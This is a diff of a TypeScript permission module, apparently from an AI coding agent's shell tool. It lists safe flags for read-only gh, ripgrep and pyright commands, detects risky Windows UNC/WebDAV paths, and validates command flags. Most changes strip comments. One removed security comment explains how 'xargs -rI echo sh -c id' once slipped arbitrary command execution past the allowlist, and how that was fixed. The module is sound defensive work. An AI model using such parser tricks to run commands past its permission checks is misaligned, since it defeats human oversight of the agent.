     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh workflow list is read-only — lists workflow files
+  
   'gh workflow list': {
     safeFlags: {
-      '--all': 'none', // Include disabled workflows
+      '--all': 'none', 
       '-a': 'none',
-      '--json': 'string', // JSON field selection
-      '--limit': 'number', // Max results
+      '--json': 'string', 
+      '--limit': 'number', 
       '-L': 'number',
-      '--repo': 'string', // Target repository
+      '--repo': 'string', 
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh workflow view is read-only — displays workflow summary
+  
   
   'gh workflow view': {
     safeFlags: {
-      '--ref': 'string', // Branch/tag with workflow version
+      '--ref': 'string', 
       '-r': 'string',
-      '--yaml': 'none', // View workflow yaml
+      '--yaml': 'none', 
       '-y': 'none',
-      '--repo': 'string', // Target repository
+      '--repo': 'string', 
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh label list is read-only — lists labels
+  
   
   'gh label list': {
     safeFlags: {
-      '--json': 'string', // JSON field selection
-      '--limit': 'number', // Max results
+      '--json': 'string', 
+      '--limit': 'number', 
       '-L': 'number',
-      '--order': 'string', // Order: asc|desc
-      '--search': 'string', // Search label names
+      '--order': 'string', 
+      '--search': 'string', 
       '-S': 'string',
-      '--sort': 'string', // Sort: created|name
-      '--repo': 'string', // Target repository
+      '--sort': 'string', 
+      '--repo': 'string', 
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh search repos is read-only — searches repositories
+  
   
   'gh search repos': {
     safeFlags: {
-      '--archived': 'none', // Filter by archived state
-      '--created': 'string', // Filter by creation date
-      '--followers': 'string', // Filter by followers count
-      '--forks': 'string', // Filter by forks count
-      '--good-first-issues': 'string', // Filter by good first issues
-      '--help-wanted-issues': 'string', // Filter by help wanted issues
-      '--include-forks': 'string', // Include forks: false|true|only
-      '--json': 'string', // JSON field selection
-      '--language': 'string', // Filter by language
-      '--license': 'string', // Filter by license
-      '--limit': 'number', // Max results
+      '--archived': 'none', 
+      '--created': 'string', 
+      '--followers': 'string', 
+      '--forks': 'string', 
+      '--good-first-issues': 'string', 
+      '--help-wanted-issues': 'string', 
+      '--include-forks': 'string', 
+      '--json': 'string', 
+      '--language': 'string', 
+      '--license': 'string', 
+      '--limit': 'number', 
       '-L': 'number',
-      '--match': 'string', // Restrict to field: name|description|readme
-      '--number-topics': 'string', // Filter by number of topics
-      '--order': 'string', // Order: asc|desc
-      '--owner': 'string', // Filter by owner
-      '--size': 'string', // Filter by size range
-      '--sort': 'string', // Sort: forks|help-wanted-issues|stars|updated
-      '--stars': 'string', // Filter by stars
-      '--topic': 'string', // Filter by topic
-      '--updated': 'string', // Filter by update date
-      '--visibility': 'string', // Filter: public|private|internal
+      '--match': 'string', 
+      '--number-topics': 'string', 
+      '--order': 'string', 
+      '--owner': 'string', 
+      '--size': 'string', 
+      '--sort': 'string', 
+      '--stars': 'string', 
+      '--topic': 'string', 
+      '--updated': 'string', 
+      '--visibility': 'string', 
     },
   },
-  // gh search issues is read-only — searches issues
+  
   
   'gh search issues': {
     safeFlags: {
-      '--app': 'string', // Filter by GitHub App author
-      '--assignee': 'string', // Filter by assignee
-      '--author': 'string', // Filter by author
-      '--closed': 'string', // Filter by closed date
-      '--commenter': 'string', // Filter by commenter
-      '--comments': 'string', // Filter by comment count
-      '--created': 'string', // Filter by creation date
-      '--include-prs': 'none', // Include PRs in results
-      '--interactions': 'string', // Filter by interactions count
-      '--involves': 'string', // Filter by involvement
-      '--json': 'string', // JSON field selection
-      '--label': 'string', // Filter by label
-      '--language': 'string', // Filter by language
-      '--limit': 'number', // Max results
+      '--app': 'string', 
+      '--assignee': 'string', 
+      '--author': 'string', 
+      '--closed': 'string', 
+      '--commenter': 'string', 
+      '--comments': 'string', 
+      '--created': 'string', 
+      '--include-prs': 'none', 
+      '--interactions': 'string', 
+      '--involves': 'string', 
+      '--json': 'string', 
+      '--label': 'string', 
+      '--language': 'string', 
+      '--limit': 'number', 
       '-L': 'number',
-      '--locked': 'none', // Filter locked conversations
-      '--match': 'string', // Restrict to field: title|body|comments
-      '--mentions': 'string', // Filter by user mentions
-      '--milestone': 'string', // Filter by milestone
-      '--no-assignee': 'none', // Filter missing assignee
-      '--no-label': 'none', // Filter missing label
-      '--no-milestone': 'none', // Filter missing milestone
-      '--no-project': 'none', // Filter missing project
-      '--order': 'string', // Order: asc|desc
-      '--owner': 'string', // Filter by owner
-      '--project': 'string', // Filter by project
-      '--reactions': 'string', // Filter by reaction count
-      '--repo': 'string', // Filter by repository
+      '--locked': 'none', 
+      '--match': 'string', 
+      '--mentions': 'string', 
+      '--milestone': 'string', 
+      '--no-assignee': 'none', 
+      '--no-label': 'none', 
+      '--no-milestone': 'none', 
+      '--no-project': 'none', 
+      '--order': 'string', 
+      '--owner': 'string', 
+      '--project': 'string', 
+      '--reactions': 'string', 
+      '--repo': 'string', 
       '-R': 'string',
-      '--sort': 'string', // Sort field
-      '--state': 'string', // Filter: open|closed
-      '--team-mentions': 'string', // Filter by team mentions
-      '--updated': 'string', // Filter by update date
-      '--visibility': 'string', // Filter: public|private|internal
+      '--sort': 'string', 
+      '--state': 'string', 
+      '--team-mentions': 'string', 
+      '--updated': 'string', 
+      '--visibility': 'string', 
     },
   },
-  // gh search prs is read-only — searches pull requests
+  
   
   'gh search prs': {
     safeFlags: {
-      '--app': 'string', // Filter by GitHub App author
-      '--assignee': 'string', // Filter by assignee
-      '--author': 'string', // Filter by author
-      '--base': 'string', // Filter by base branch
+      '--app': 'string', 
+      '--assignee': 'string', 
+      '--author': 'string', 
+      '--base': 'string', 
       '-B': 'string',
-      '--checks': 'string', // Filter by check status
-      '--closed': 'string', // Filter by closed date
-      '--commenter': 'string', // Filter by commenter
-      '--comments': 'string', // Filter by comment count
-      '--created': 'string', // Filter by creation date
-      '--draft': 'none', // Filter draft PRs
-      '--head': 'string', // Filter by head branch
+      '--checks': 'string', 
+      '--closed': 'string', 
+      '--commenter': 'string', 
+      '--comments': 'string', 
+      '--created': 'string', 
+      '--draft': 'none', 
+      '--head': 'string', 
       '-H': 'string',
-      '--interactions': 'string', // Filter by interactions count
-      '--involves': 'string', // Filter by involvement
-      '--json': 'string', // JSON field selection
-      '--label': 'string', // Filter by label
-      '--language': 'string', // Filter by language
-      '--limit': 'number', // Max results
+      '--interactions': 'string', 
+      '--involves': 'string', 
+      '--json': 'string', 
+      '--label': 'string', 
+      '--language': 'string', 
+      '--limit': 'number', 
       '-L': 'number',
-      '--locked': 'none', // Filter locked conversations
-      '--match': 'string', // Restrict to field: title|body|comments
-      '--mentions': 'string', // Filter by user mentions
-      '--merged': 'none', // Filter merged PRs
-      '--merged-at': 'string', // Filter by merge date
-      '--milestone': 'string', // Filter by milestone
-      '--no-assignee': 'none', // Filter missing assignee
-      '--no-label': 'none', // Filter missing label
-      '--no-milestone': 'none', // Filter missing milestone
-      '--no-project': 'none', // Filter missing project
-      '--order': 'string', // Order: asc|desc
-      '--owner': 'string', // Filter by owner
-      '--project': 'string', // Filter by project
-      '--reactions': 'string', // Filter by reaction count
-      '--repo': 'string', // Filter by repository
+      '--locked': 'none', 
+      '--match': 'string', 
+      '--mentions': 'string', 
+      '--merged': 'none', 
+      '--merged-at': 'string', 
+      '--milestone': 'string', 
+      '--no-assignee': 'none', 
+      '--no-label': 'none', 
+      '--no-milestone': 'none', 
+      '--no-project': 'none', 
+      '--order': 'string', 
+      '--owner': 'string', 
+      '--project': 'string', 
+      '--reactions': 'string', 
+      '--repo': 'string', 
       '-R': 'string',
-      '--review': 'string', // Filter by review status
-      '--review-requested': 'string', // Filter by review requested
-      '--reviewed-by': 'string', // Filter by reviewer
-      '--sort': 'string', // Sort field
-      '--state': 'string', // Filter: open|closed
-      '--team-mentions': 'string', // Filter by team mentions
-      '--updated': 'string', // Filter by update date
-      '--visibility': 'string', // Filter: public|private|internal
+      '--review': 'string', 
+      '--review-requested': 'string', 
+      '--reviewed-by': 'string', 
+      '--sort': 'string', 
+      '--state': 'string', 
+      '--team-mentions': 'string', 
+      '--updated': 'string', 
+      '--visibility': 'string', 
     },
   },
-  // gh search commits is read-only — searches commits
+  
   
   'gh search commits': {
     safeFlags: {
-      '--author': 'string', // Filter by author
-      '--author-date': 'string', // Filter by authored date
-      '--author-email': 'string', // Filter by author email
-      '--author-name': 'string', // Filter by author name
-      '--committer': 'string', // Filter by committer
-      '--committer-date': 'string', // Filter by committed date
-      '--committer-email': 'string', // Filter by committer email
-      '--committer-name': 'string', // Filter by committer name
-      '--hash': 'string', // Filter by commit hash
-      '--json': 'string', // JSON field selection
-      '--limit': 'number', // Max results
+      '--author': 'string', 
+      '--author-date': 'string', 
+      '--author-email': 'string', 
+      '--author-name': 'string', 
+      '--committer': 'string', 
+      '--committer-date': 'string', 
+      '--committer-email': 'string', 
+      '--committer-name': 'string', 
+      '--hash': 'string', 
+      '--json': 'string', 
+      '--limit': 'number', 
       '-L': 'number',
-      '--merge': 'none', // Filter merge commits
-      '--order': 'string', // Order: asc|desc
-      '--owner': 'string', // Filter by owner
-      '--parent': 'string', // Filter by parent hash
-      '--repo': 'string', // Filter by repository
+      '--merge': 'none', 
+      '--order': 'string', 
+      '--owner': 'string', 
+      '--parent': 'string', 
+      '--repo': 'string', 
       '-R': 'string',
-      '--sort': 'string', // Sort: author-date|committer-date
-      '--tree': 'string', // Filter by tree hash
-      '--visibility': 'string', // Filter: public|private|internal
+      '--sort': 'string', 
+      '--tree': 'string', 
+      '--visibility': 'string', 
     },
   },
-  // gh search code is read-only — searches code
+  
   
   'gh search code': {
     safeFlags: {
-      '--extension': 'string', // Filter by file extension
-      '--filename': 'string', // Filter by filename
-      '--json': 'string', // JSON field selection
-      '--language': 'string', // Filter by language
-      '--limit': 'number', // Max results
+      '--extension': 'string', 
+      '--filename': 'string', 
+      '--json': 'string', 
+      '--language': 'string', 
+      '--limit': 'number', 
       '-L': 'number',
-      '--match': 'string', // Restrict to: file|path
-      '--owner': 'string', // Filter by owner
-      '--repo': 'string', // Filter by repository
+      '--match': 'string', 
+      '--owner': 'string', 
+      '--repo': 'string', 
       '-R': 'string',
-      '--size': 'string', // Filter by size range
+      '--size': 'string', 
     },
   },
 }
-
-// ---------------------------------------------------------------------------
 
 export const DOCKER_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
   {
@@ -1377,98 +1361,94 @@ export const DOCKER_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
     },
   }
 
-// ---------------------------------------------------------------------------
-
 export const RIPGREP_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
   {
     rg: {
       safeFlags: {
-        // Pattern flags
-        '-e': 'string', // Pattern to search for
+        
+        '-e': 'string', 
         '--regexp': 'string',
-        '-f': 'string', // Read patterns from file
+        '-f': 'string', 
 
         
-        '-i': 'none', // Case insensitive
+        '-i': 'none', 
         '--ignore-case': 'none',
-        '-S': 'none', // Smart case
+        '-S': 'none', 
         '--smart-case': 'none',
-        '-F': 'none', // Fixed strings
+        '-F': 'none', 
         '--fixed-strings': 'none',
-        '-w': 'none', // Word regexp
+        '-w': 'none', 
         '--word-regexp': 'none',
-        '-v': 'none', // Invert match
+        '-v': 'none', 
         '--invert-match': 'none',
 
-        // Output options
-        '-c': 'none', // Count matches
+        
+        '-c': 'none', 
         '--count': 'none',
-        '-l': 'none', // Files with matches
+        '-l': 'none', 
         '--files-with-matches': 'none',
         '--files-without-match': 'none',
-        '-n': 'none', // Line number
+        '-n': 'none', 
         '--line-number': 'none',
-        '-o': 'none', // Only matching
+        '-o': 'none', 
         '--only-matching': 'none',
-        '-A': 'number', // After context
+        '-A': 'number', 
         '--after-context': 'number',
-        '-B': 'number', // Before context
+        '-B': 'number', 
         '--before-context': 'number',
-        '-C': 'number', // Context
+        '-C': 'number', 
         '--context': 'number',
-        '-H': 'none', // With filename
-        '-h': 'none', // No filename
+        '-H': 'none', 
+        '-h': 'none', 
         '--heading': 'none',
         '--no-heading': 'none',
-        '-q': 'none', // Quiet
+        '-q': 'none', 
         '--quiet': 'none',
         '--column': 'none',
 
-        // File filtering
-        '-g': 'string', // Glob
+        
+        '-g': 'string', 
         '--glob': 'string',
-        '-t': 'string', // Type
+        '-t': 'string', 
         '--type': 'string',
-        '-T': 'string', // Type not
+        '-T': 'string', 
         '--type-not': 'string',
         '--type-list': 'none',
         '--hidden': 'none',
         '--no-ignore': 'none',
-        '-u': 'none', // Unrestricted
+        '-u': 'none', 
 
         
-        '-m': 'number', // Max count per file
+        '-m': 'number', 
         '--max-count': 'number',
-        '-d': 'number', // Max depth
+        '-d': 'number', 
         '--max-depth': 'number',
-        '-a': 'none', // Text (search binary files)
+        '-a': 'none', 
         '--text': 'none',
-        '-z': 'none', // Search zip
-        '-L': 'none', // Follow symlinks
+        '-z': 'none', 
+        '-L': 'none', 
         '--follow': 'none',
 
-        // Display options
+        
         '--color': 'string',
         '--json': 'none',
         '--stats': 'none',
 
-        // Help and version
+        
         '--help': 'none',
         '--version': 'none',
         '--debug': 'none',
 
-        // Special argument separator
+        
         '--': 'none',
       },
     },
   }
 
-// ---------------------------------------------------------------------------
-
 export const PYRIGHT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
   {
     pyright: {
-      respectsDoubleDash: false, // pyright treats -- as a file path, not end-of-options
+      respectsDoubleDash: false, 
       safeFlags: {
         '--outputjson': 'none',
         '--project': 'string',
@@ -1488,13 +1468,11 @@ export const PYRIGHT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
         _rawCommand: string,
         args: string[],
       ) => {
-        // Check if --watch or -w appears as a standalone token (flag)
+        
         return args.some(t => t === '--watch' || t === '-w')
       },
     },
   }
-
-// ---------------------------------------------------------------------------
 
 export const EXTERNAL_READONLY_COMMANDS: readonly string[] = [
   
@@ -1503,12 +1481,12 @@ export const EXTERNAL_READONLY_COMMANDS: readonly string[] = [
 ] as const
 
 export function containsVulnerableUncPath(pathOrCommand: string): boolean {
-  // Only check on Windows platform
+  
   if (getPlatform() !== 'windows') {
     return false
   }
 
-  // 1. Check for general UNC paths with backslashes
+  
   
   
   
@@ -1517,19 +1495,19 @@ export function containsVulnerableUncPath(pathOrCommand: string): boolean {
     return true
   }
 
-  // 2. Check for forward-slash UNC paths
+  
   
   
   
   
   const forwardSlashUncPattern =
-    // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() on short command strings
+    
     /(?<!:)\/\/[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i
   if (forwardSlashUncPattern.test(pathOrCommand)) {
     return true
   }
 
-  // 3. Check for mixed-separator UNC paths (forward slash + backslashes)
+  
   
   
   
@@ -1539,7 +1517,7 @@ export function containsVulnerableUncPath(pathOrCommand: string): boolean {
     return true
   }
 
-  // 4. Check for mixed-separator UNC paths (backslashes + forward slash)
+  
   
   
   const reverseMixedSlashUncPattern = /\\{2,}\/[^\s\\/]/
@@ -1547,19 +1525,19 @@ export function containsVulnerableUncPath(pathOrCommand: string): boolean {
     return true
   }
 
-  // 5. Check for WebDAV SSL/port patterns
+  
   
   if (/@SSL@\d+/i.test(pathOrCommand) || /@\d+@SSL/i.test(pathOrCommand)) {
     return true
   }
 
-  // 6. Check for DavWWWRoot marker (Windows WebDAV redirector)
+  
   
   if (/DavWWWRoot/i.test(pathOrCommand)) {
     return true
   }
 
-  // 7. Check for UNC paths with IPv4 addresses (explicit check for defense-in-depth)
+  
   
   if (
     /^\\\\(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand) ||
@@ -1568,7 +1546,7 @@ export function containsVulnerableUncPath(pathOrCommand: string): boolean {
     return true
   }
 
-  // 8. Check for UNC paths with bracketed IPv6 addresses (explicit check for defense-in-depth)
+  
   
   if (
     /^\\\\(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand) ||
@@ -1579,8 +1557,6 @@ export function containsVulnerableUncPath(pathOrCommand: string): boolean {
 
   return false
 }
-
-// ---------------------------------------------------------------------------
 
 export const FLAG_PATTERN = /^-[a-zA-Z0-9_-]/
 
@@ -1606,18 +1582,6 @@ export function validateFlagArgument(
   }
 }
 
-/**
- * Validates the flags/arguments portion of a tokenized command against a config.
- * This is the flag-walking loop extracted from BashTool's isCommandSafeViaFlagParsing.
- *
- * @param tokens - Pre-tokenized args (from bash shell-quote or PowerShell AST)
- * @param startIndex - Where to start validating (after command tokens)
- * @param config - The safe flags config
- * @param options.commandName - For command-specific handling (git numeric shorthand, grep/rg attached numeric)
- * @param options.rawCommand - For additionalCommandIsDangerousCallback
- * @param options.xargsTargetCommands - If provided, enables xargs-style target command detection
- * @returns true if all flags are valid, false otherwise
- */
 export function validateFlags(
   tokens: string[],
   startIndex: number,
@@ -1637,7 +1601,7 @@ export function validateFlags(
       continue
     }
 
-    // Special handling for xargs: once we find the target command, stop validating flags
+    
     if (
       options?.xargsTargetCommands &&
       options.commandName === 'xargs' &&
@@ -1654,27 +1618,20 @@ export function validateFlags(
     }
 
     if (token === '--') {
-      // SECURITY: Only break if the tool respects POSIX `--` (default: true).
-      // Tools like pyright don't respect `--` — they treat it as a file path
+      
+      
       
       
       if (config.respectsDoubleDash !== false) {
         i++
         break 
       }
-      // Tool doesn't respect --: treat as positional arg, keep validating
+      
       i++
       continue
     }
 
     if (token.startsWith('-') && token.length > 1 && FLAG_PATTERN.test(token)) {
-      // Handle --flag=value format
-      // SECURITY: Track whether the token CONTAINS `=` separately from
-      // whether the value is non-empty. `-E=` has `hasEquals=true` but
-      // `inlineValue=''` (falsy). Without `hasEquals`, the falsy check at
-      // line ~1813 would fall through to "consume next token" — but GNU
-      // getopt for short options with mandatory arg sees `-E=` as `-E` with
-      // ATTACHED arg `=` (it doesn't strip `=` for short options). Parser
       
       
       
@@ -1685,7 +1642,14 @@ export function validateFlags(
       
       
       
-      // indicating they provided a value (empty). Don't consume next token.
+      
+      
+      
+      
+      
+      
+      
+      
       const hasEquals = token.includes('=')
       const [flag, ...valueParts] = token.split('=')
       const inlineValue = valueParts.join('=')
@@ -1697,54 +1661,54 @@ export function validateFlags(
       const flagArgType = config.safeFlags[flag]
 
       if (!flagArgType) {
-        // Special case: git commands support -<number> as shorthand for -n <number>
+        
         if (options?.commandName === 'git' && flag.match(/^-\d+$/)) {
-          // This is equivalent to -n flag which is safe for git log/diff/show
+          
           i++
           continue
         }
 
-        // Handle flags with directly attached numeric arguments (e.g., -A20, -B10)
-        // Only apply this special handling to grep and rg commands
+        
+        
         if (
           (options?.commandName === 'grep' || options?.commandName === 'rg') &&
           flag.startsWith('-') &&
           !flag.startsWith('--') &&
           flag.length > 2
         ) {
-          const potentialFlag = flag.substring(0, 2) // e.g., '-A' from '-A20'
-          const potentialValue = flag.substring(2) // e.g., '20' from '-A20'
+          const potentialFlag = flag.substring(0, 2) 
+          const potentialValue = flag.substring(2) 
 
           if (config.safeFlags[potentialFlag] && /^\d+$/.test(potentialValue)) {
-            // This is a flag with attached numeric argument
+            
             const flagArgType = config.safeFlags[potentialFlag]
             if (flagArgType === 'number' || flagArgType === 'string') {
-              // Validate the numeric value
+              
               if (validateFlagArgument(potentialValue, flagArgType)) {
                 i++
                 continue
               } else {
-                return false // Invalid attached value
+                return false 
               }
             }
           }
         }
 
-        // Handle combined single-letter flags like -nr
-        // SECURITY: We must NOT allow any bundled flag that takes an argument.
-        // GNU getopt bundling semantics: when an arg-taking option appears LAST
-        // in a bundle with no trailing chars, the NEXT argv element is consumed
-        // as its argument. So `xargs -rI echo sh -c id` is parsed by xargs as:
-        //   -r (no-arg) + -I with replace-str=`echo`, target=`sh -c id`
-        // Our naive handler previously only checked EXISTENCE in safeFlags (both
-        // `-r: 'none'` and `-I: '{}'` are truthy), then `i++` consumed ONE token.
-        // This created a parser differential: our validator thought `echo` was
-        // the xargs target (in SAFE_TARGET_COMMANDS_FOR_XARGS → break), but
-        // xargs ran `sh -c id`. ARBITRARY RCE with only Bash(echo:*) or less.
-        //
-        // Fix: require ALL bundled flags to have arg type 'none'. If any bundled
-        // flag requires an argument (non-'none' type), reject the whole bundle.
-        // This is conservative — it blocks `-rI` (xargs) entirely, but that's
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
         
         if (flag.startsWith('-') && !flag.startsWith('--') && flag.length > 2) {
           for (let j = 1; j < flag.length; j++) {
@@ -1753,7 +1717,7 @@ export function validateFlags(
             if (!flagType) {
               return false 
             }
-            // SECURITY: Bundled flags must be no-arg type. An arg-taking flag
+            
             
             
             if (flagType !== 'none') {
@@ -1767,10 +1731,10 @@ export function validateFlags(
         }
       }
 
-      // Validate flag arguments
+      
       if (flagArgType === 'none') {
-        // SECURITY: hasEquals covers `-FLAG=` (empty inline). Without it,
-        // `-FLAG=` with 'none' type would pass (inlineValue='' is falsy).
+        
+        
         if (hasEquals) {
           return false 
         }
@@ -1783,7 +1747,7 @@ export function validateFlags(
           argValue = inlineValue
           i++
         } else {
-          // Check if next token is the argument
+          
           if (
             i + 1 >= tokens.length ||
             (tokens[i + 1] &&
@@ -1797,31 +1761,31 @@ export function validateFlags(
           i += 2
         }
 
-        // Defense-in-depth: For string arguments, reject values that start with '-'
+        
         
         
         
         if (flagArgType === 'string' && argValue.startsWith('-')) {
-          // Special case: git's --sort flag allows - prefix for reverse sorting
+          
           if (
             flag === '--sort' &&
             options?.commandName === 'git' &&
             argValue.match(/^-[a-zA-Z]/)
           ) {
-            // This looks like a reverse sort (e.g., -refname, -version:refname)
-            // Allow it if the rest looks like a valid sort key
+            
+            
           } else {
             return false
           }
         }
 
-        // Validate argument based on type
+        
         if (!validateFlagArgument(argValue, flagArgType)) {
           return false
         }
       }
     } else {
-      // Non-flag argument (like revision specs, file paths, etc.) - this is allowed
+      
       i++
     }
   }
